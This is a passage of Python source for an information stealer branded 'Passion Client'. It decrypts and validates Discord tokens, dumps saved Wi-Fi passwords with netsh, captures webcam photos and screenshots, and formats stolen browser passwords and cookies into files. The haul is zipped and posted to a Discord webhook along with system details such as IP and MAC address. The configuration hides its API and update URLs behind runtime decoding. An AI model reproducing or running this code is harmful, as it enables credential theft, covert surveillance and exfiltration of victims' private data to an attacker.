            
            # Discord's token encryption format
            nonce = encrypted_data[3:15]
            payload = encrypted_data[15:]
            
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt(payload)
            
            # Remove auth tag (last 16 bytes)
            if len(decrypted) >= 16:
                token = decrypted[:-16].decode('utf-8', errors='ignore')
                return token
            return None
        except Exception:
            return None

    def _validate_discord_token(self, token):
        """Validate if token is working"""
        try:
            headers = {'Authorization': token}
            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=5)
            return r.status_code == 200
        except Exception:
            return False
    
    def extract_wifi_passwords(self):
        """Extract WiFi passwords quickly"""
        try:
            result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], 
                                   capture_output=True, text=True, timeout=5)
            
            for line in result.stdout.split('\n'):
                if "All User Profile" in line:
                    profile = line.split(':')[1].strip()
                    try:
                        result = subprocess.run(['netsh', 'wlan', 'show', 'profile', 
                                               profile, 'key=clear'], 
                                              capture_output=True, text=True, timeout=3)
                        for line2 in result.stdout.split('\n'):
                            if "Key Content" in line2:
                                password = line2.split(':')[1].strip()
                                self.data['wifi'].append({
                                    'ssid': profile,
                                    'password': password
                                })
                                break
                    except:
                        pass
        except:
            pass
    


    def capture_webcam(self):
        """Capture photo from webcam"""
        try:
            
            # Try OpenCV first (if available)
            try:
                import cv2
                cap = cv2.VideoCapture(0)
                if cap.isOpened():
                    ret, frame = cap.read()
                    if ret:
                        webcam_path = os.path.join(self.temp_dir, 'webcam.jpg')
                        cv2.imwrite(webcam_path, frame)
                        cap.release()
                        cv2.destroyAllWindows()
                        self.data['screenshots'].append(webcam_path)
                        return
                cap.release()
            except ImportError:
                print("[Error]")
            except Exception as e:
                print(f"[DEBUG]{e}")
            
            # Fallback to PIL + VideoCapture (Windows only)
            try:
                import cv2
                # Try again with different backend
                cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                if cap.isOpened():
                    ret, frame = cap.read()
                    if ret:
                        webcam_path = os.path.join(self.temp_dir, 'webcam.jpg')
                        cv2.imwrite(webcam_path, frame)
                        cap.release()
                        self.data['screenshots'].append(webcam_path)
                        return
                cap.release()
            except:
                pass
            
            # Another fallback using pyautogui + webcam via simplecv
            try:
                import subprocess
                import tempfile
                
                # Try using PowerShell to capture webcam (Windows only)
                ps_script = '''
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$webcam = New-Object System.Windows.Forms.PictureBox
$webcam.Size = New-Object System.Drawing.Size(640, 480)

$webcamCapture = New-Object System.Windows.Forms.Timer
$webcamCapture.Interval = 100
$webcamCapture.Add_Tick({
    $form.Close()
})

$form = New-Object System.Windows.Forms.Form
$form.Controls.Add($webcam)
$form.Add_Shown({
    $webcamCapture.Start()
})
$form.ShowDialog()
'''
                ps_file = os.path.join(self.temp_dir, 'capture.ps1')
                with open(ps_file, 'w') as f:
                    f.write(ps_script)
                
                
            except:
                pass
                
        except Exception as e:
            print(f"[ERROR]{e}")


    def take_screenshot(self):
        """Take a single screenshot quickly"""
        try:
            import pyautogui
            screenshot = pyautogui.screenshot()
            screenshot_path = os.path.join(self.temp_dir, 'screenshot.png')
            screenshot.save(screenshot_path)
            self.data['screenshots'].append(screenshot_path)
        except:
            pass
    
    def create_formatted_output(self):
        """Create nicely formatted text/JSON files"""
        
        # Save system info as JSON
        with open(os.path.join(self.temp_dir, 'system_info.json'), 'w') as f:
            json.dump(self.data['system'], f, indent=2)
        
        # Save passwords in readable format
        if self.data['browsers']:
            with open(os.path.join(self.temp_dir, 'passwords.txt'), 'w', encoding='utf-8') as f:
                f.write("=" * 60 + "\n")
                f.write("PASSWORDS EXPORT\n")
                f.write("=" * 60 + "\n\n")
                
                for browser, data in self.data['browsers'].items():
                    if data.get('passwords'):
                        f.write(f"\n[{browser.upper()} PASSWORDS]\n")
                        f.write("-" * 40 + "\n")
                        for p in data['passwords']:
                            f.write(f"URL: {p.get('url', 'N/A')}\n")
                            f.write(f"Username: {p.get('username', 'N/A')}\n")
                            f.write(f"Password: {p.get('password', 'N/A')}\n")
                            f.write("-" * 40 + "\n")
        
        # Save cookies as JSON
        cookies_data = {}
        for browser, data in self.data['browsers'].items():
            if data.get('cookies'):
                cookies_data[browser] = data['cookies']
        
        if cookies_data:
            with open(os.path.join(self.temp_dir, 'cookies.json'), 'w') as f:
                json.dump(cookies_data, f, indent=2)
        
        # Save Discord tokens
        if self.data['discord']:
            with open(os.path.join(self.temp_dir, 'discord_tokens.txt'), 'w') as f:
                f.write("=" * 60 + "\n")
                f.write("DISCORD TOKENS\n")
                f.write("=" * 60 + "\n\n")
                for token in self.data['discord']:
                    f.write(f"{token}\n")
        
        # Save WiFi passwords
        if self.data['wifi']:
            with open(os.path.join(self.temp_dir, 'wifi_passwords.txt'), 'w') as f:
                f.write("=" * 60 + "\n")
                f.write("WIFI PASSWORDS\n")
                f.write("=" * 60 + "\n\n")
                for wifi in self.data['wifi']:
                    f.write(f"SSID: {wifi['ssid']}\n")
                    f.write(f"Password: {wifi['password']}\n")
                    f.write("-" * 40 + "\n")
        
        # Save summary
        with open(os.path.join(self.temp_dir, 'summary.txt'), 'w') as f:
            f.write("=" * 60 + "\n")
            f.write("PASSION EXTRACTION SUMMARY\n")
            f.write("=" * 60 + "\n\n")
            f.write(f"Computer: {self.data['system'].get('computer_name', 'N/A')}\n")
            f.write(f"User: {self.data['system'].get('username', 'N/A')}\n")
            f.write(f"IP: {self.data['system'].get('public_ip', 'N/A')}\n")
            f.write(f"Time: {self.data['system'].get('timestamp', 'N/A')}\n\n")
            
            total_passwords = sum(len(b.get('passwords', [])) for b in self.data['browsers'].values())
            total_cookies = sum(len(b.get('cookies', [])) for b in self.data['browsers'].values())
            
            f.write(f"Passwords found: {total_passwords}\n")
            f.write(f"Cookies found: {total_cookies}\n")
            f.write(f"Discord tokens: {len(self.data['discord'])}\n")
            f.write(f"WiFi networks: {len(self.data['wifi'])}\n")
    
    def create_and_send_zip(self):
        """Create ZIP and send to Discord"""
        try:
            zip_buffer = io.BytesIO()
            
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                for root, dirs, files in os.walk(self.temp_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.basename(file_path)
                        zip_file.write(file_path, arcname)
            
            zip_buffer.seek(0)
            self.send_to_discord(zip_buffer.getvalue())
            
        except Exception as e:
            print(f"ZIP creation error: {e}")
    
    def send_to_discord(self, zip_data):
        """Send to Discord with detailed system info and stats"""
        try:
            # Calculate totals
            total_passwords = 0
            browser_stats = []
            
            for browser, data in self.data['browsers'].items():
                pwd_count = len(data.get('passwords', []))
                cookie_count = len(data.get('cookies', []))
                if pwd_count > 0 or cookie_count > 0:
                    browser_stats.append(f"{browser}: {pwd_count}pwd, {cookie_count}ck")
                    total_passwords += pwd_count
            
            browser_summary = "\n".join(browser_stats) if browser_stats else "None"
            
            # Get WiFi info
            wifi_info = ""
            if self.data['wifi']:
                wifi_list = []
                for wifi in self.data['wifi'][:3]:  # Show first 3
                    wifi_list.append(f"{wifi['ssid']}: {wifi['password']}")
                wifi_info = "\n".join(wifi_list)
                if len(self.data['wifi']) > 3:
                    wifi_info += f"\n... and {len(self.data['wifi'])-3} more"
            else:
                wifi_info = "None found"
            
            # Create detailed embed
            embed = {
                "title": "🔐 Passion Client - Data Extraction Complete",
                "color": 0xe02726,
                "fields": [
                    {
                        "name": "💻 SYSTEM INFORMATION",
                        "value": f"```\nUser: {self.data['system'].get('username', 'N/A')}\nPC: {self.data['system'].get('computer_name', 'N/A')}\nLocal IP: {self.data['system'].get('local_ip', 'N/A')}\nPublic IP: {self.data['system'].get('public_ip', 'N/A')}\nOS: {self.data['system'].get('os', 'N/A')[:50]}\nMAC: {self.data['system'].get('mac_address', 'N/A')}\nTime: {self.data['system'].get('timestamp', 'N/A')}```",
                        "inline": False
                    },
                    {
                        "name": "🌐 BROWSER PASSWORDS",
                        "value": f"```\nTotal: {total_passwords} passwords\n\n{browser_summary}```",
                        "inline": True
                    },
                    {
                        "name": "📊 OTHER DATA",
                        "value": f"```\nWiFi Networks: {len(self.data['wifi'])}\nDiscord Tokens: {len(self.data['discord'])}\nScreenshots: {len(self.data['screenshots'])}```",
                        "inline": True
                    },
                    {
                        "name": "📶 WIFI NETWORKS",
                        "value": f"```\n{wifi_info}```",
                        "inline": False
                    }

                ],
                "footer": {
                    "text": f"Passion Client • {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                }
            }
            
            # Send file with embed
            files = {'file': ('passion_data.zip', zip_data, 'application/zip')}
            payload = {'payload_json': json.dumps({'embeds': [embed]})}
            
            response = requests.post(self.webhook_url, files=files, data=payload, timeout=10)
            
        except Exception as e:
            print(f"[ERROR]{e}")
    
    def get_browser_summary(self):
        """Get summary of browser data"""
        total_passwords = 0
        total_cookies = 0
        
        for browser, data in self.data['browsers'].items():
            if isinstance(data, dict):
                total_passwords += len(data.get('passwords', []))
                total_cookies += len(data.get('cookies', []))
        
        return f"```\nPasswords: {total_passwords}\nCookies: {total_cookies}\nBrowsers: {len(self.data['browsers'])}\n```"
    
    def get_stats_summary(self):
        """Get statistics summary"""
        wifi_count = len(self.data.get('wifi', []))
        discord_tokens = len(self.data.get('discord', {}).get('tokens', []))
        screenshots = len(self.data.get('screenshots', []))
        
        return f"**WiFi Networks:** {wifi_count}\n**Discord Tokens:** {discord_tokens}\n**Screenshots:** {screenshots}"


# ── CONFIG ─────────────────────────────────────────────────────────────────────
API_BASE      = _resolved_base  # decoded at runtime
SETTINGS_FILE = os.path.join(os.path.dirname(os.path.abspath(sys.argv[0])), "passion_settings.json")
WIN_W, WIN_H  = 700, 420
SIDEBAR_W     = 200
RADIUS        = 17   # Match login screen exactly

# ── AUTO-UPDATER CONFIG ─────────────────────────────────────────────────────────
CURRENT_VERSION  = "1.0.5"
# R2 public URL — put version.json and passion_client.exe in the same bucket/folder
R2_VERSION_URL   = _resolved_version  # decoded at runtime
# version.json format:
# { "version": "1.0.1", "url": "https://pub-HASH.r2.dev/passion/passion_client.exe" }

# ── Embedded Logo ──────────────────────────────────────────────────────────────
LOGO_B64 = b"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